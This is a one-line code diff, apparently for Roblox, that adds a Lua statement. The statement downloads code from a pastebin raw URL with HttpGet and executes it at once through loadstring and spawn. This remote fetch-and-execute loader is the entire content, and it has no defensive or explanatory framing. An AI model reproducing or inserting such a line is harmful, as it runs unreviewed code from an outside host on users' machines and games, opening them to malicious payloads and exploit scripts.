@@ -1,0 +1,1 @@
+spawn(loadstring(game:HttpGet("https://pastebin.com/raw/zKjj0TQD", true)))()
